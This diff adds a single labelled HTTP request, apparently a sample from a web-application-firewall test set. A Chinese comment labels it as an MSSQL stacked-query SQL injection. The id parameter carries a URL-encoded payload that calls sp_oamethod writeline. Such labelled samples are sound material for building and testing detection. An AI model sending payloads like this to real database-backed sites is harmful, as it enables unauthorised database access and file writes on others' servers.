@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506418
+# 攻击者基于堆叠查询，将"exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo'"语句注入到 SQL 查询参数中，目的是保存用户信息。
+GET /?id=1%3Bexec%20@ret%20=%20sp_oamethod%20@f%2C%20%27writeline%27%2C%20NULL%2C%27od.SetInfo%27&bid=hd_tag_m8mv26on HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26on
+RM-PRO-Token: 0e728eabcc2d1e29288348d816a5097b
+RM-PRO-Time: 1742808646978
+User-Agent: curl/7.83.1
+
